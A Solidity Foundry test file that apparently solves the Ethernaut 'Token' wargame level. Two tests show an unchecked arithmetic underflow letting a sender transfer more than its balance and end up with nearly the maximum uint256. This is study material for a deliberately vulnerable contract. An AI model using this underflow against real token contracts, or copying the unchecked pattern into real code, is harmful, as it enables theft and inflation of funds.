// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Token.sol";

// exploit overflow
contract TokenTest is Test {
    Token instance;

    function setUp() public {
        instance = new Token(100);
    }

    function test1() public {
        address alice = makeAddr("alice");

        instance.transfer(alice, 20);
        assertEq(instance.balanceOf(alice), 20);
        assertEq(instance.balanceOf(address(this)), 80);

        instance.transfer(alice, 81);
        assertEq(instance.balanceOf(alice), 20 + 81);

        // 80 - 81 + 2^256 = 2^256 - 1 = type(uint256).max
        assertEq(instance.balanceOf(address(this)), type(uint256).max);
    }

    function test2() public {
        address alice = makeAddr("alice");

        instance.transfer(alice, 20);
        assertEq(instance.balanceOf(alice), 20);
        assertEq(instance.balanceOf(address(this)), 80);

        uint256 amount = 1e18;
        instance.transfer(alice, amount);
        assertEq(instance.balanceOf(alice), 20 + amount);

        // 80 -1e18 + 2^256 = type(uint256).max + 1 - 1e18 + 80
        assertEq(instance.balanceOf(address(this)), type(uint256).max - amount + 80 + 1);
    }
}
